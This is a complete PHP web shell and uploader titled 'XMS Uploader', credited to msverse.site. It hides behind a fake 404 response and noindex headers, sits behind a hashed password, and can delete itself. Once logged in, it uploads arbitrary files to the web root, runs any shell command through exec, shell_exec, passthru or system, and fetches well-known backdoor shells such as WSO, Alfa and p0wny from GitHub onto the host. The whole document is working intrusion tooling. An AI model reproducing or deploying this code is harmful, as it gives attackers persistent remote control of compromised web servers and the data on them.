<?php
session_start();
error_reporting(0);
http_response_code(404);
ini_set('max_execution_time', 0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");
@header("X-Robots-Tag: noindex, nofollow", true);

/////////////////////////////////////////////////
// Author: msverse.site
// Date: 23/03/2024
////////////////////////////////////////////////
// Jangan lupa mampir ke blogku ya 

$password = "2cc652642aa55f441260f27829c5e631"; // md5: XMS

function login_shell() {
    ?>
    <!DOCTYPE HTML>
    <html>
    <head>
        <meta name="robots" content="noindex, nofollow">
        <title>XMS</title>
        <style type="text/css">
            html {
                margin: 20px auto;
                background: #000000;
                color: green;
                text-align: center;
            }

            header {
                color: green;
                margin: 10px auto;
            }

            input[type=password] {
                width: 250px;
                height: 25px;
                color: red;
                background: transparent;
                border: 1px dotted green;
                margin-left: 20px;
                text-align: center;
            }
        </style>
    </head>
    <body>
    <center>
        <header>
            <pre>
     __   _____  ___ _____
     \ \ / /|  \/  |/  ___|
      \ V / | .  . |\ `--.
      /   \ | |\/| | `--. \
     / /^\ \| |  | |/\__/ /
     \/   \/\_|  |_/\____/
        </pre>
        </header>
        <form method='post'>
            <input type='password' name='password'>
        </form>
    </center>
    </body>
    </html>
    <?php
    exit;
}

function kill_shell() {
    unlink(__FILE__);
    exit;
}

function logout_shell() {
    session_destroy();
    header("Location: {$_SERVER['PHP_SELF']}");
    exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password))) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}

function upload_with_file_get_contents($url, $file) {
    $data = file_get_contents($file);
    $result = file_put_contents($url, $data);
    return $result !== false;
}

if(isset($_GET['action'])) {
    $action = $_GET['action'];
    if($action == 'kill') {
        kill_shell();
    } elseif($action == 'logout') {
        logout_shell();
    }
}

?>
<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title>XMS Uploader</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: "VT323", monospace;
            background-color: #f9f9f9;
            color: #333;
            text-align: center;
        }

        img {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
<img src="https://i.ibb.co/gS5zDmF/1711143224188.png" width="200" height="300" alt="XMS">
<p><a href="https://www.msverse.site" alt="msverse">[ XMS ]</p></a>
<p>[ <a href="?action=kill">KILL</a> ] [ <a href="?action=logout">LOGOUT</a> ]</p>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="just_file">
    <input type="submit" name="upload" value="Upload!">
</form>
<?php
$root = $_SERVER['DOCUMENT_ROOT'];
if (isset($_POST['upload'])) {
    $files = $_FILES['just_file']['name'];
    $dest = $root . '/' . $files;
    if (is_writable($root)) {
        if (@copy($_FILES['just_file']['tmp_name'], $dest)) {
            $web = "http://" . $_SERVER['HTTP_HOST'] . "/";
            echo "<font color='green'>sukses upload -> <a href='$web$files' target='_blank'><b><u>$web/$files</u></b></a></font>";
        } else {
            echo "<font color='skyblue'>gagal upload di document root.</font>";
        }
    } else {
        if (@copy($_FILES['just_file']['tmp_name'], $files)) {
            echo " upload <b>$files</b> di folder ini";
        } else {
            echo "gagal upload";
        }
    }
}
?>
<form method="post">
    <select name="shell_url">
        <option value="https://raw.githubusercontent.com/MSVerse/msvfm/main/msvfm.php">Mini Shell</option>
        <option value="https://raw.githubusercontent.com/nicxlau/alfa-shell/master/alfa-obfuscated.php">Alfa Shell</option>
        <option value="https://raw.githubusercontent.com/0xAsuka/indoxploit-shell/master/shell-v3.php">IndoXploit V3</option>
        <option value="https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php">p0wny shell</option>
        <option value="https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php">WSO Shell</option>
        <option value="https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php">Marijuana</option>
        <option value="https://raw.githubusercontent.com/zerobyte-id/PHP-Backdoor/master/0byt3m1n1/0byt3m1n1.php">0BYT3M1N1 Shell</option>
        <option value="https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php">Adminer</option>
    </select>
    <input type="submit" value="Summon">
</form>
<?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
            $cmdOutput = null;
            $cmd = $_POST['cmd'];
            $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
            $cmd = "cd " . escapeshellarg($path) . " && " . $cmd;
            if (function_exists('exec')) {
                @exec($cmd, $output, $returnVar);
                if ($returnVar === 0) {
                    $cmdOutput = implode("\n", $output);
                }
            } elseif (function_exists('shell_exec')) {
                $cmdOutput = @shell_exec($cmd);
            } elseif (function_exists('passthru')) {
                ob_start();
               @passthru($cmd, $returnVar);
                $cmdOutput = ob_get_clean();
            } elseif (function_exists('system')) {
                ob_start();
                @system($cmd, $returnVar);
                $cmdOutput = ob_get_clean();
            }
        }
        ?>
        <form method="POST" action="">
            <input type='text' size='30' height='10' name='cmd' placeholder='Command'>
             <input type="submit" class="empty-button">
        </form>
</div>
<?php if (!empty($cmdOutput)) { ?>
    <div class="message-container">
        <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
    </div>
<?php } ?>
<?php
if(isset($_POST['shell_url'])) {
    $url = $_POST['shell_url'];
    $filename = basename($url);
    if (upload_with_file_get_contents($filename, $url)) {
        echo "<font color='green'>ok <b>$filename</b></font>";
    } else {
        echo "<font color='red'>er <b>$filename</b></font>";
    }
}
?>
<br>
<footer>[ <a href="https://www.msverse.site" alt="msverse">msverse</a> ]</footer>
</body>
</html>
